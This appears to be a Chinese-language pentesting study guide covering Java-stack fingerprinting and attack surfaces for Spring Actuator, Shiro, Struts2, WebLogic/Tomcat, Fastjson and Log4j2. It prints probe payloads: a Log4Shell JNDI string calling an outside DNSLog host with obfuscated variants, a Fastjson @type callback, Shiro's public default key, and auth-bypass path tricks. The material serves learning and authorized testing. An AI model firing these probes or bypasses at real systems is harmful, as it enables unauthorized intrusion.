# 03 · Java 生态：判定 · 攻击面地图 · 测试 · 学习

> Java 是国产企业系统的主力栈（也是你 12 周课表 Track B 的主线）。
> 本篇按「遭遇频率」排组件：Spring 系 → Shiro → Struts2 → 中间件（WebLogic/Tomcat）→ 审计面（MyBatis/Fastjson/Log4j2）。
> 语法基础不在这：Java 语言/反射/序列化机制看 `05_基础补全/vendor/JavaGuide/`，审计流程看 cnvd-lab J01-J03。

---

## 〇、Java 栈判定链（总流程）

```
JSESSIONID / rememberMe / .action / whitelabel 任一出现
    → 确认 Java
    → 三分支判定：
       ① Spring 系?   /error JSON 四字段 + /actuator 存在性 + X-Application-Context
       ② Shiro?       rememberMe cookie（含 deleteMe 反应）
       ③ Struts2?     URL 以 .action/.do 结尾 + OGNL 类报错
    → 版本定位：报错堆栈行号 / 静态资源哈希 / 功能特征（见各组件）
    → 中间件层判定：Server 头 + 404 页长相（Tomcat 猫页 / WebLogic console 跳转 / Undertow 极简）
```

---

## 一、Spring / Spring Boot（遭遇率第一）

### 【判定】
| 证据 | 强度 | 说明 |
|---|---|---|
| Whitelabel Error Page（`This application has no explicit mapping for /error`） | 高 | SpringBoot 默认错误页，被定制的少 |
| `/error` 返回 `{"timestamp","status","error","path"}` 四字段 JSON | 高 | SpringBoot API 风格默认 |
| `X-Application-Context: app:prod:8080` 头 | 极高 | 老版本 Boot（2.x 早期）直接报应用名+环境+端口；新版默认关，**看到=老版本** |
| `JSESSIONID` + `/actuator` 200/401 | 高 | actuator 存在本身就是 Boot 指纹 |
| 报错含 `org.springframework.web.servlet` / `DispatcherServlet` | 极高 | |
| Spring Security 登录页默认样式 / `login?error` `login?logout` 参数 | 中 | 默认表单登录模板长相辨识度高 |

### 【攻击面地图】（按 Spring 的「闸」结构记，不是按 CVE 记）
```
Actuator 端点（Boot 的寄生门，dojo 02 边界④⑩）
  /actuator/env        → 配置全泄露（数据库密码/JWT key/云AK 常在里面）
  /actuator/heapdump   → 内存 dump（搜出密码/token，证据级=存在即高危）
  /actuator/jolokia    → JMX over HTTP（历史链：logback reconfigure → RCE）
  /actuator/loggers    → POST 改日志级别（配合 jolokia 组合链）
  /actuator/gateway/routes（WebFlux gateway）→ CVE-2022-22947 SpEL RCE 面
  /actuator/mappings   → 全部路由清单（=接口字典白送）
  变体路径：/actuator/xxx · /xxx（老版本无 /actuator 前缀）· management 端口独立部署时在主站看不到（SSRF/内网面）
参数绑定面
  CVE-2022-22965 Spring4Shell：JDK9+ & WAR 部署 & Tomcat & 特定参数绑定 → classLoader 链写文件
  判定三要素缺一不可（版本<5.3.18/5.2.20 + JDK≥9 + war包）——判定条件比 payload 重要
SpEL 面
  CVE-2022-22963（Spring Cloud Function routing-expression 头）
  应用内任何「表达式配置」功能（规则引擎/动态路由/模板配置页）
鉴权面（审计视角，你的 Track B 主粮）
  Spring Security 的 authorizeRequests 顺序缺陷：antMatchers 顺序错=前宽后严失效
  @PreAuthorize 注解缺失的 Controller 方法（逐个对比=越权审计清单）
  permitAll() 清单过宽（常见：/api/public/** 下混着敏感接口）
```

### 【测试】最小验证
```
1. /actuator（401/403/404 三态判定：401=有但未授权→找独立管理端口或绕过；404=关了或改前缀→试 /manage/xxx、老路径）
2. env/heapdump 存在 → 高危成立（heapdump 下载属「读取敏感数据」——存在性+首字节 magic 证明即停，不全量下载分析）
3. mappings 存在 → 拿到全部接口 → 转越权测试流程（07 篇 04 §3-4）—— actuator 的最大价值不是它自己，是它送你的接口字典
4. Spring4Shell 判定：先查三要素（版本从报错/静态资源/功能特征推），不满足不发 payload
```

### 【绕过】actuator 被挡时的正路
- 独立管理端口（`management.server.port`）常与主端口不同且**不过 WAF**——SSRF/内网探测时的首选目标
- 路径变体：`/actuator;/env`（分号路径，Tomcat 解析特性）、`//actuator//env`、`;/actuator/env`（矩阵参数）、大小写——**本质是网关与 Tomcat 的路径归一化差异**（dojo 06 防御者视角的实例）
- Spring Security 放行规则常见缝隙：静态资源放行 `/resources/**` 与 actuator 路径重叠的历史版本

### 【学习】
- 本地：Spring Initializr 起一个带 actuator+security 的项目（**这是你 J01 课目的最佳载体**——写一遍胜过读十遍）；vulhub 的 spring 系列
- 智库：`actuator` · `heapdump` · `spring4shell` · `SpEL` · `Spring Security 越权`
- 验收：能画 SpringBoot 应用的边界图（网关→Security filter chain→DispatcherServlet→Controller→Service→Mapper），标出每层的闸；actuator 8 个高危端点不查表能列 6 个

---

## 二、Apache Shiro（国产 Java 系统的鉴权标配）

### 【判定】（三步确认，全部单请求）
```
① 登录失败/登出响应 Set-Cookie 含 rememberMe=deleteMe  → Shiro 确认（招牌指纹，唯一性极高）
② 送任意 rememberMe=xxx（乱填 base64）→ 再回 deleteMe → cookie 解密失败路径确认
③ 版本线索：Shiro 1.2.4 前默认 AES-CBCC + 硬编码 key（kPH+bIxk5D2deZiIxcaaaA== 为首的经典 key 清单公开）；
   1.4.2+ 默认 GCM；PathMatchingFilter 的路径归一化问题各版本反复修（CVE-2020-1957/13933/17531 系列）
```

### 【攻击面地图】
```
① 默认 key 反序列化（历史存量最大）：
   key 已知清单逐个试（每 key 一次请求=默认口令级检查，非爆破）
   → 正确 key 的特征：响应不再 deleteMe / 时间差 / DNSLog 回连（用无害探测链）
② 认证绕过（路径归一化差异，Shiro filter 与后端容器对路径理解不一致）：
   /admin 被拦 → /admin/ · /admin;.jpg · //admin · /%2e/admin · /admin/./ 
   （每变体一发，看 302 变 200 —— 这是解析差异绕过的教科书案例，dojo 06 §二 ②③ 层）
③ rememberMe 本身的「存在」= 反序列化入口存在，即使无默认 key（自定义 key 泄露路径：配置文件/.git/heapdump/env）
```

### 【测试】红线版
- 默认 key 探测：DNSLog 无害链（URLDNS 类只触发 DNS 解析）**证明「key 正确+可反序列化」即停**——不送利用链（07 篇反序列化红线全适用）。
- 路径绕过：找到「未授权可达的管理接口」即停，不深入管理功能操作。

### 【学习】
- 本地：vulhub shiro-550/shiro-721 环境；key 清单原理（AbstractRememberMeManager 源码——vendor/JavaGuide 反射篇的前置知识正好用上）
- 智库：`Shiro 550` · `Shiro 721` · `rememberMe` · `Shiro 绕过`（中文源丰富）
- 验收：能解释 CBC padding oracle 在 Shiro 721 里的作用机制（一句话说清：回显差异泄露明文比特）；路径绕过 5 变体各自利用的是哪层解析差异

---

## 三、Struts2（存量系统仍在，N-day 富矿）

### 【判定】：URL 以 `.action`/`.do` 结尾（强特征）；报错含 `ognl.OgnlException`/`There is no Action mapped for namespace`；`struts.multipart.parser` 类报错=版本敏感信息白送。
### 【攻击面】：S2 系列 CVE 全在「输入进入 OGNL 求值」这一条河上——Content-Type 头（S2-045/046）、`redirect:`/`action:` 前缀（S2-016/032）、多语言参数（S2-057 需 alwaysSelectFullNamespace）、上传文件名。判定=版本号（报错里常有）；无版本时**按 CVE 时间线从新到旧逐个无害探测**（DNSLog 回显链）。
### 【测试红线】：OGNL 表达式探测用「算术回显」（`%{3*3}` 返回 9）或 DNSLog，**不执行命令**——`%{...}` 里放命令就是 RCE 执行，证明到算术/DNS 即高危成立。
### 【学习】：vulhub struts2 系列全通（它是「一个数据流模式生出一族 CVE」的最佳教材，配合 dojo 02/01 读）；智库 `S2-` · `OGNL`。验收：能用数据流语言解释 S2-045 的源头/汇点（Content-Type 头 → multipart 解析器报错信息构造 → OGNL 求值）。

---

## 四、WebLogic / Tomcat / JBoss（中间件层，详见 05 篇，此处只放 Java 侧判定）

| 组件 | 判定指纹 | 头部攻击面（识别级） |
|---|---|---|
| **WebLogic** | `/console` 登录页（招牌）；`bea_wls_deployment_internal` 路径；7001 端口 T3 banner；报错含 `weblogic.` | console 弱口令/未授权（CVE-2020-14882 双 URL 绕过认证）；T3/IIOP 反序列化系列（2015-4852 起）；`_async` XML 反序列化（2017-10271/2019-2521 系） |
| **Tomcat** | 猫形 404/500 默认页；`Server: Apache-Coyote/1.1`（老）；AJP 8009 | `/manager/html` 弱口令→WAR 部署（=RCE，红线：证明登录成功即停）；PUT 写文件（CVE-2017-12615，readonly=false）；AJP Ghostcat（CVE-2020-1938，读 WEB-INF/包含 RCE）；examples 目录（老版本信息泄露面） |
| **JBoss/WildFly** | `/jmx-console`（4.x 时代）· `/management`（新）· 8080 欢迎页 | jmx-console 未授权（存量古董系统仍有）→ MBean 部署 war；deserialization 面（EJB/JNDI） |

---

## 五、审计面三件套：MyBatis / Fastjson / Log4j2（代码审计时的高频命中点）

### MyBatis（Track B 审计主战场）
```
审计目标：${} 与 #{} 的分布 —— ${} 是字符串拼接（注入面），#{} 是预编译
高发位置（结构位，01 篇 §四）：ORDER BY ${sort} / LIKE '%${kw}%' / IN (${ids}) / 动态表名
工具：cnvd-lab tools/mybatis_dollar_scan.sh（你已有）——本篇补「人审」的部分：
  看到 ${} 三问：①值从哪来（追到 Controller 入参=可达）②有没有白名单校验 ③校验在哪层（前端的不算）
Mapper XML 与注解（@Select）双源都要扫；MyBatis-Plus 的 wrapper 相对安全但 orderBy 字段仍常裸传
```

### Fastjson（JSON 解析面的历史重灾区）
```
判定：①报错含 com.alibaba.fastjson.JSONException；②autoType is not support. xxx 报错=有 Fastjson 且 autoType 被拦（版本线索！）；
     ③DNSLog 无害探测：{"@type":"java.net.Inet4Address","val":"<你的dnslog>"} → 回连=Fastjson 确认+出网确认
版本面：1.2.24（初代 autoType RCE）→ 1.2.47（缓存绕过，通杀到 47）→ 1.2.68（expectClass）→ 1.2.80+ safeMode
     2.x 重写但仍出过 autoType 绕过——「版本+safeMode 开没开」双判定
红线：DNSLog 证明即停（高危成立），不打利用链（链=gadget=实际 RCE，属证明过度）
智库：fastjson（中文源极丰富）· `autoType` · `@type`
```

### Log4j2（Log4Shell，CVE-2021-44228）
```
判定：任何「会进日志的输入」都是探测点——User-Agent / X-Forwarded-For / Referer / 登录用户名 / 搜索词 / 订单备注
     探测值：${jndi:ldap://<你的dnslog>/x} （DNS 回连=存在且出网；仅 dns 协议回连而 ldap 不通=部分修复/出网限制）
版本面：2.0-beta9 ~ 2.14.1 受影响；2.15/2.16/2.17 三连修（各自还有残留绕过面，报告建议直接升 2.17+）
变体混淆（识别级，理解机制即可）：${${lower:j}ndi:...} / ${::-j}${::-n}${::-d}${::-i} —— 全是「Log4j 自身的 lookup 嵌套求值」机制，
     这就是为什么黑名单过滤 ${jndi 字面量必然失败（dojo 06 §一 盲区类的完美案例）
红线：DNSLog 回连即高危证据，不加载远程类（那一步=RCE 执行）
智库：log4j · jndi · `log4shell bypass`
```

---

## 【本篇学习建议】

1. **学习顺序服从你的 Track B**：J01（语法）进行时同步读本篇 §五 MyBatis；J02（反序列化）时同步 §二 Shiro + §五 Fastjson；J03（CodeQL）时把本篇所有「判定指纹」写成 CodeQL/grep 规则——**手册变工具，才算学完**。
2. 本篇所有组件的「攻击面地图」都用同一副眼镜看：**寄生门（actuator/console/manager）+ 解析差异（路径归一化）+ 数据变指令（OGNL/SpEL/反序列化/JNDI）**——三个模式记住，新组件出现你能自己推它的攻击面（这就是 L3）。
3. 每个组件配一次 vulhub 本地实操（先打后看答案纪律），实操后案例卡入库（家族归类：actuator 类/默认key类/路径绕过类…）。
4. 版本判定能力是 Java 生态的第一生产力（N-day 全靠它）：练「静态资源哈希比对法」（07 篇 03 §8）直到 10 分钟内给出任意 Java 系统的框架+中间件+版本三件套。

## 【验收标准】

- [ ] 判定链 §〇 能默画，三分支各自的确认探针能背
- [ ] actuator 高危端点 6 个 + Shiro 三步判定 + Fastjson DNSLog 探针 + Log4Shell 探测点清单，四样不查表
- [ ] vulhub 完成 shiro-550 + struts2 s2-045 + spring(CVE-2022-22947) 三个环境（先打后看）
- [ ] 能用「三副眼镜」给一个你没见过的 Java 组件现场推导攻击面（AI 苏格拉底模板验证）
- [ ] cnvd-lab J02 课目完成时，本篇 §二§五 的案例卡 ≥3 张

## 【智库检索词】

`actuator heapdump` · `shiro rememberme` · `S2-045` · `weblogic 14882` · `ghostcat` · `fastjson autotype` · `log4shell` · `jolokia` · `spring security bypass`（HackTricks Java 章节 1038 篇里的 pentesting-web/spring 系）
